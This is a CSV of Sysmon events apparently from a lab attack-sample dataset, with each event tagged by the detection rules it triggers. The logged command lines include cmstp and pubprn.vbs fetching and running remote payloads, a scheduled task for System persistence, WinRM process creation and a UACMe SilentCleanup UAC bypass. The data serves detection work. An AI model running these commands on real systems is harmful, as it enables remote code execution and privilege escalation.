2019-07-29T21:34:25.659355+00:00,Bypass UAC via CMSTP;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4985,MSEDGEWIN10,"Image: C:\Windows\System32\cmstp.exe
RuleName: ''
Description: Microsoft Connection Manager Profile Installer
TerminalSessionId: 1
ParentCommandLine: cmd  /c cmstp.exe /ni /s https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp.inf
Product: Microsoft(R) Connection Manager
Company: Microsoft Corporation
ParentProcessId: 6428
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=89030EB0DE2B856B47105CA67DAAC722ABAF0BDF,MD5=D9818B3C3BC0AF0A5374C71272581C08,SHA256=DB3F360BDB292C0679C13149AC6F454F7DCE768BDE559D87CE718023A6985A0D,IMPHASH=109BA8ED3C458360A74EA1216207CA09
ParentProcessGuid: 747F3D96-6661-5D3F-0000-00107AB88D00
ProcessId: 6820
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6661-5D3F-0000-0010CBC88D00
CommandLine: cmstp.exe  /ni /s https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp.inf
FileVersion: 7.2.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:25.519
"
2019-07-29T21:34:30.237042+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4986,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 2244
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6666-5D3F-0000-001016F78D00
CommandLine: cmd  /c forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:30.221
"
2019-07-29T21:34:30.258082+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4987,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 4976
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6666-5D3F-0000-0010C6F88D00
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:30.250
"
2019-07-29T21:34:30.685271+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4988,MSEDGEWIN10,"Image: C:\Windows\System32\forfiles.exe
RuleName: ''
Description: ForFiles - Executes a command on selected files
TerminalSessionId: 1
ParentCommandLine: cmd  /c forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2244
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=B7002C1601C326ED60C38E23366E5E8C919F326A,MD5=6E9F3CBB041D0670E2AC3378C3360045,SHA256=FA84D5B043EAD140FE304CBC71A9BFB3D24D3542FAB45DB65606C47808BD9272,IMPHASH=BB3BC1A3FEF88F916302D61DDC886F80
ParentProcessGuid: 747F3D96-6666-5D3F-0000-001016F78D00
ProcessId: 1464
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6666-5D3F-0000-0010AE068E00
CommandLine: forfiles  /p c:\windows\system32 /m notepad.exe /c calc.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:30.462
"
2019-07-29T21:34:30.807635+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4989,MSEDGEWIN10,"Image: C:\Windows\System32\calc.exe
RuleName: ''
Description: Windows Calculator
TerminalSessionId: 1
ParentCommandLine: forfiles  /p c:\windows\system32 /m notepad.exe /c calc.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1464
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=F5ED372FD8EC7C455FF66BCE73F16CA51CBC0302,MD5=DEAD69D07BC33B762ABD466FB6F53E11,SHA256=3091E2ABFB55D05D6284B6C4B058B62C8C28AFC1D883B699E9A2B5482EC6FD51,IMPHASH=8EEAA9499666119D13B3F44ECD77A729
ParentProcessGuid: 747F3D96-6666-5D3F-0000-0010AE068E00
ProcessId: 4336
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6666-5D3F-0000-0010DF098E00
CommandLine: '""C:\Windows\system32\calc.exe""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\forfiles.exe
UtcTime: 2019-07-29 21:34:30.552
"
2019-07-29T21:34:35.313087+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4990,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 5840
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-666B-5D3F-0000-001051638E00
CommandLine: 'cmd  /c winrm qc -q '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:35.246
"
2019-07-29T21:34:35.337716+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4991,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 1580
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-666B-5D3F-0000-001033648E00
CommandLine: cmd  /c winrm i c wmicimv2/Win32_Process @{CommandLine=""calc""}
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:35.285
"
2019-07-29T21:34:35.347710+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4992,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 6412
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-666B-5D3F-0000-00107C668E00
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:35.333
"
2019-07-29T21:34:35.838188+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4993,MSEDGEWIN10,"Image: C:\Windows\System32\cscript.exe
RuleName: ''
Description: Microsoft ® Console Based Script Host
TerminalSessionId: 1
ParentCommandLine: 'cmd  /c winrm qc -q '
Product: Microsoft ® Windows Script Host
Company: Microsoft Corporation
ParentProcessId: 5840
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=0E3C0779D8EAAD3B00363D7890DDC8272B510D49,MD5=A45586B3A5A291516CD10EF4FD3EE768,SHA256=59D3CDC7D51FA34C6B27B8B04EA17992955466EB25022B7BD64880AB35DF0BBC,IMPHASH=2B44D2206B9865383429E9C1524F1CAC
ParentProcessGuid: 747F3D96-666B-5D3F-0000-001051638E00
ProcessId: 3224
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-666B-5D3F-0000-00102F7F8E00
CommandLine: cscript  //nologo ""C:\Windows\System32\winrm.vbs"" qc -q
FileVersion: 5.812.10240.16384
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:35.663
"
2019-07-29T21:34:35.878709+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4994,MSEDGEWIN10,"Image: C:\Windows\System32\cscript.exe
RuleName: ''
Description: Microsoft ® Console Based Script Host
TerminalSessionId: 1
ParentCommandLine: cmd  /c winrm i c wmicimv2/Win32_Process @{CommandLine=""calc""}
Product: Microsoft ® Windows Script Host
Company: Microsoft Corporation
ParentProcessId: 1580
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=0E3C0779D8EAAD3B00363D7890DDC8272B510D49,MD5=A45586B3A5A291516CD10EF4FD3EE768,SHA256=59D3CDC7D51FA34C6B27B8B04EA17992955466EB25022B7BD64880AB35DF0BBC,IMPHASH=2B44D2206B9865383429E9C1524F1CAC
ParentProcessGuid: 747F3D96-666B-5D3F-0000-001033648E00
ProcessId: 264
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-666B-5D3F-0000-0010EF858E00
CommandLine: cscript  //nologo ""C:\Windows\System32\winrm.vbs"" i c wmicimv2/Win32_Process @{CommandLine=""calc""}
FileVersion: 5.812.10240.16384
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:35.763
"
2019-07-29T21:34:36.534474+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process;WmiPrvSE Spawned A Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4998,MSEDGEWIN10,"Image: C:\Windows\System32\calc.exe
RuleName: ''
Description: Windows Calculator
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2996
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=F5ED372FD8EC7C455FF66BCE73F16CA51CBC0302,MD5=DEAD69D07BC33B762ABD466FB6F53E11,SHA256=3091E2ABFB55D05D6284B6C4B058B62C8C28AFC1D883B699E9A2B5482EC6FD51,IMPHASH=8EEAA9499666119D13B3F44ECD77A729
ParentProcessGuid: 747F3D96-6642-5D3F-0000-001044A68A00
ProcessId: 3872
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-666C-5D3F-0000-00104BB78E00
CommandLine: calc
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
UtcTime: 2019-07-29 21:34:36.528
"
2019-07-29T21:34:40.261289+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;Suspicious Calculator Usage;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,5000,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 2916
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6670-5D3F-0000-001099048F00
CommandLine: cmd  /c schtasks /create /tn ""mysc"" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru ""System"" /f
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:40.243
"
2019-07-29T21:34:40.385520+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,5001,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 4720
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6670-5D3F-0000-00105F098F00
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:40.335
"
2019-07-29T21:34:40.889027+00:00,Hacktool - EDR-Freeze Execution;Scheduled Task Creation Via Schtasks.EXE;Suspicious Calculator Usage;Suspicious Schtasks Schedule Types;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,5002,MSEDGEWIN10,"Image: C:\Windows\System32\schtasks.exe
RuleName: Persistence - Scheduled Task Management
Description: Task Scheduler Configuration Tool
TerminalSessionId: 1
ParentCommandLine: cmd  /c schtasks /create /tn ""mysc"" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru ""System"" /f
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2916
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=112C8FFA1C0934ACAAD2C58B3C7E81F3FB8E4A2C,MD5=3F9FD6D3B3E96B8F576DB72035DB38A7,SHA256=D6BA2CD73799477C051D9D864C47FCF5108064CDE07D3565871AFA10FC548086,IMPHASH=7EE4BC5589713B3470B8A950256E2E69
ParentProcessGuid: 747F3D96-6670-5D3F-0000-001099048F00
ProcessId: 7076
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6670-5D3F-0000-0010F9148F00
CommandLine: schtasks  /create /tn ""mysc"" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru ""System"" /f
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:40.755
"
2019-07-29T21:34:45.242404+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;Pubprn.vbs Proxy Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,5004,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 4184
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6675-5D3F-0000-0010AA498F00
CommandLine: cmd  /c cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:45.198
"
2019-07-29T21:34:45.311645+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,5005,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 6192
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6675-5D3F-0000-0010774E8F00
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:45.307
"
2019-07-29T21:34:45.606737+00:00,Hacktool - EDR-Freeze Execution;Pubprn.vbs Proxy Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,5006,MSEDGEWIN10,"Image: C:\Windows\System32\cscript.exe
RuleName: ''
Description: Microsoft ® Console Based Script Host
TerminalSessionId: 1
ParentCommandLine: cmd  /c cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct
Product: Microsoft ® Windows Script Host
Company: Microsoft Corporation
ParentProcessId: 4184
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=0E3C0779D8EAAD3B00363D7890DDC8272B510D49,MD5=A45586B3A5A291516CD10EF4FD3EE768,SHA256=59D3CDC7D51FA34C6B27B8B04EA17992955466EB25022B7BD64880AB35DF0BBC,IMPHASH=2B44D2206B9865383429E9C1524F1CAC
ParentProcessGuid: 747F3D96-6675-5D3F-0000-0010AA498F00
ProcessId: 4036
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6675-5D3F-0000-0010875C8F00
CommandLine: cscript  /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct
FileVersion: 5.812.10240.16384
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:34:45.524
"
2019-08-03T09:46:48.209718+00:00,HackTool - UACMe Akagi Execution;Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_34.evtx,1,Microsoft-Windows-Sysmon,1,5131,MSEDGEWIN10,"Image: C:\Users\IEUser\Desktop\UACME.exe
RuleName: ''
Description: UACMe main module
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" '
Product: UACMe
Company: Hazardous Environments
ParentProcessId: 2492
LogonGuid: 747F3D96-56A3-5D45-0000-0020FBD31800
Hashes: SHA1=9E57914D39FBFE785C915E225011892613C4714C,MD5=D57E778DF10F801F47119A04BE990FFD,SHA256=D76815CE3F4B9FE7A611D6F536F65AF313E2AB2F8BB52EF0998487D89A6E7378,IMPHASH=B6789EDFE23DDA911AE37C87444D3DCB
ParentProcessGuid: 747F3D96-57E0-5D45-0000-001076D73D00
ProcessId: 924
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 747F3D96-5808-5D45-0000-00106CDC3E00
CommandLine: UACME.exe  34
FileVersion: 3.1.9.1905
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3fb'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-08-03 09:46:48.195
"
2019-08-03T09:46:48.726304+00:00,Bypass UAC Using SilentCleanup Task,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_34.evtx,1,Microsoft-Windows-Sysmon,13,5132,MSEDGEWIN10,"Image: C:\Windows\explorer.exe
TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Environment\windir
RuleName: PrivEsc - UAC bypass UACME-34
EventType: SetValue
ProcessId: 924
ProcessGuid: 747F3D96-5808-5D45-0000-00106CDC3E00
UtcTime: 2019-08-03 09:46:48.692
Details: '""C:\Windows\system32\cmd.exe""'
"
2019-08-03T09:46:48.924858+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_34.evtx,1,Microsoft-Windows-Sysmon,1,5133,MSEDGEWIN10,"Image: C:\Windows\System32\schtasks.exe
RuleName: Persistence - Scheduled Task Management
Description: Task Scheduler Configuration Tool
TerminalSessionId: 1
ParentCommandLine: UACME.exe  34
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 924
LogonGuid: 747F3D96-56A3-5D45-0000-0020FBD31800
Hashes: SHA1=112C8FFA1C0934ACAAD2C58B3C7E81F3FB8E4A2C,MD5=3F9FD6D3B3E96B8F576DB72035DB38A7,SHA256=D6BA2CD73799477C051D9D864C47FCF5108064CDE07D3565871AFA10FC548086,IMPHASH=7EE4BC5589713B3470B8A950256E2E69
ParentProcessGuid: 747F3D96-5808-5D45-0000-00106CDC3E00
ProcessId: 1268
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 747F3D96-5808-5D45-0000-0010D1FE3E00
CommandLine: '""C:\Windows\System32\schtasks.exe"" /run /tn ""\Microsoft\Windows\DiskCleanup\SilentCleanup"" /i'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3fb'
IntegrityLevel: Medium
ParentImage: C:\Users\IEUser\Desktop\UACME.exe
UtcTime: 2019-08-03 09:46:48.842
"
2019-08-03T09:46:49.402550+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using Disk Cleanup;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_34.evtx,1,Microsoft-Windows-Sysmon,1,5134,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1072
LogonGuid: 747F3D96-56A3-5D45-0000-0020B3D31800
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D4EA-5D45-0000-00105CD60000
ProcessId: 1380
CurrentDirectory: C:\Windows\system32\
